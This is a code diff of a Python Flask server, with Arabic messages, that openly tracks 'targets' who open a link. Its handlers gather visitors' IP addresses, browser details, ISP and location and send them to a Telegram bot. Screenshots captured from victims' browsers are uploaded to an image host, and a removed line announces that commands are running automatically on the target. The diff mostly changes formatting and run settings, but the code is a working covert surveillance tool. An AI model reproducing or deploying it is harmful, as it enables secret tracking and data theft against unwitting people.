@@ -14,7 +14,6 @@ def send_telegram(message):
 
 @app.route('/')
 def index():
-    send_telegram("🚨 تم فتح الرابط الآن من أحد المستهدفين. بدء تنفيذ الأوامر تلقائيًا...")
     return render_template('index.html')
 
 @app.route('/map')
@@ -45,10 +44,12 @@ def location():
 def fingerprint():
     ip = request.remote_addr
     ua = request.headers.get('User-Agent', 'غير معروف')
+
     isp_info = requests.get("https://ipapi.co/json/").json()
-    isp = isp_info.get("org", "؟")
+    isp = isp_info.get("org", "غير معروف")
     city = isp_info.get("city", "?")
     country = isp_info.get("country_name", "?")
+
     msg = f"🧠 <b>معلومات الجهاز:</b>\n🌍 الدولة: {country}\n🏙️ المدينة: {city}\n💼 مزود الإنترنت: {isp}\n🖥️ الجهاز: {ua}\n🌐 IP: {ip}"
     send_telegram(msg)
     return 'OK'
@@ -58,8 +59,10 @@ def screenshot():
     data_url = request.get_data().decode('utf-8')
     _, encoded = data_url.split(',', 1)
     binary_data = base64.b64decode(encoded)
+
     with open("temp.png", "wb") as f:
         f.write(binary_data)
+
     with open("temp.png", "rb") as f:
         res = requests.post("https://api.imgbb.com/1/upload", data={"key": IMGBB_API_KEY}, files={"image": f})
     img_url = res.json()['data']['url']
@@ -82,4 +85,4 @@ def trigger_action(action):
     return 'OK'
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=10000)
+    app.run(debug=True)
